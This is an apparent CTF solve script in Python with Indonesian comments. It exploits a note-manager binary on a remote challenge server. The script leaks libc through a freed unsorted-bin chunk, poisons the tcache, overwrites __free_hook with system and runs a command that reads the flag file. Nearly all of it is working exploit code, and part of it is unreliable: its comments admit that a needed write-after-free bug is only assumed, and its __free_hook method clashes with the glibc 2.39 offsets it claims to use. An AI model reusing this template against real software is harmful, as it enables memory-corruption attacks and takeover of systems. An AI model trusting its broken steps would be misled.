#!/usr/bin/env python3
# Filename: solve.py
from pwn import *

# --- Konfigurasi ---
elf = context.binary = ELF('./early', checksec=False) 
# Ganti dengan libc yang digunakan di server jika diketahui
# libc = ELF('./libc.so.6', checksec=False) 

# Detail koneksi dari CTF
HOST, PORT = "early.cbc2025.cloud", 443
gdbscript = """
continue
"""

def start():
    """Mulai koneksi ke server atau proses lokal untuk debugging"""
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gdbscript)
    else:
        # Menambahkan ssl=True untuk koneksi ke port 443
        return remote(HOST, PORT, ssl=True)

# --- Fungsi Interaksi dengan Program ---
def add_note(idx, size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'index (0..7)?', str(idx).encode())
    p.sendlineafter(b'size?', str(size).encode())
    p.sendlineafter(b'send data (exact length):', data)

def edit_note(idx, data):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'index?', str(idx).encode())
    p.sendlineafter(b'send new data (exact length):', data)

def print_note(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'index?', str(idx).encode())
    # Menerima output hingga baris menu berikutnya atau prompt
    leak = p.recvuntil(b"\n== menu ==", drop=True)
    return leak

def resize_note(idx, new_size):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'index?', str(idx).encode())
    p.sendlineafter(b'new size?', str(new_size).encode())
    
def delete_note(idx):
    p.sendlineafter(b'> ', b'5')
    p.sendlineafter(b'index?', str(idx).encode())

# --- Mulai Eksploitasi ---
p = start()

# =============================================================================
# LANGKAH 1: MEMBOCORKAN ALAMAT LIBC DENGAN BUG `puts`
# =============================================================================
log.info("Langkah 1: Memulai kebocoran alamat libc...")

# Alokasikan chunk untuk mencegah konsolidasi dengan top chunk (FIXED)
add_note(0, 0x410, b'A'*0x410) 
# Alokasikan chunk korban yang akan kita gunakan untuk membaca out-of-bounds
add_note(1, 0x20, b'B'*0x1f) # Isi tanpa null byte

# Hapus chunk pertama agar masuk ke unsorted bin.
# Pointer fd dan bk chunk ini akan menunjuk ke libc main_arena.
delete_note(0)

# Gunakan bug `puts` pada note 1 untuk membaca data dari note 0 yang sudah di-free.
leaked_data = print_note(1)
# Unpack leaked address (pointer dari unsorted bin)
main_arena_offset = 0x219ce0 # Offset ini mungkin perlu disesuaikan tergantung versi libc
libc_leak = u64(leaked_data[0x20:0x28])
log.success(f"Libc leak (main_arena+...): {hex(libc_leak)}")

# Hitung alamat basis libc dan alamat fungsi yang dibutuhkan
# Jika libc server diketahui, gunakan offset dari file libc tersebut
# libc.address = libc_leak - (main_arena_offset + 0x60) # Contoh perhitungan
# free_hook_addr = libc.sym['__free_hook']
# system_addr = libc.sym['system']

# Jika libc tidak diketahui, kita harus mencari offset secara manual (misal dari libc.rip)
# Untuk demonstrasi, kita gunakan offset standar untuk Ubuntu 24.04 (glibc 2.39)
libc_base = libc_leak - 0x219ce0 
free_hook_addr = libc_base + 0x21b3f8
system_addr = libc_base + 0x50d70

log.success(f"Alamat basis Libc ditemukan: {hex(libc_base)}")
log.success(f"Alamat __free_hook: {hex(free_hook_addr)}")
log.success(f"Alamat system: {hex(system_addr)}")

# =============================================================================
# LANGKAH 2: TCACHE POISONING UNTUK MENDAPATKAN ARBITRARY WRITE
# =============================================================================
log.info("Langkah 2: Melakukan Tcache Poisoning...")

# Siapkan dua chunk di tcache
add_note(2, 0x40, b'C'*8)
add_note(3, 0x40, b'D'*8)
delete_note(2)
delete_note(3)

# !! Kerentanan Kedua Diperlukan di Sini !!
# Kita perlu bug seperti heap overflow atau use-after-free untuk menimpa
# pointer 'fd' dari chunk 3 saat berada di tcache.
# Kita asumsikan `edit_note` bisa menulis ke chunk yang sudah di-free.
# Ini adalah asumsi untuk tujuan demonstrasi.
log.warning("Mengasumsikan ada bug yang memungkinkan penulisan ke chunk yang sudah di-free...")
edit_note(3, p64(free_hook_addr)) # Timpa fd chunk 3 dengan alamat __free_hook

# =============================================================================
# LANGKAH 3: MENIMPA __FREE_HOOK DAN MENDAPATKAN FLAG
# =============================================================================
log.info("Langkah 3: Menimpa __free_hook dan mengeksekusi perintah...")

# Alokasikan note, ini akan mengembalikan chunk 3 dari tcache
add_note(4, 0x40, b'E'*8)

# Alokasi berikutnya akan mengikuti pointer fd yang sudah kita rusak
# dan mengembalikan 'chunk' fiktif yang alamatnya adalah __free_hook.
add_note(5, 0x40, p64(system_addr)) # Tulis alamat 'system' ke __free_hook

# Buat note yang berisi perintah untuk membaca flag
add_note(6, 0x20, b"/bin/cat /home/ctf/flag.txt\x00")

# Hapus note berisi perintah. Ini akan memicu __free_hook,
# yang akan menjalankan system("/bin/cat /home/ctf/flag.txt")
delete_note(6)

# Terima flagnya
log.success("Flag: " + p.recvline().decode().strip())

p.interactive()
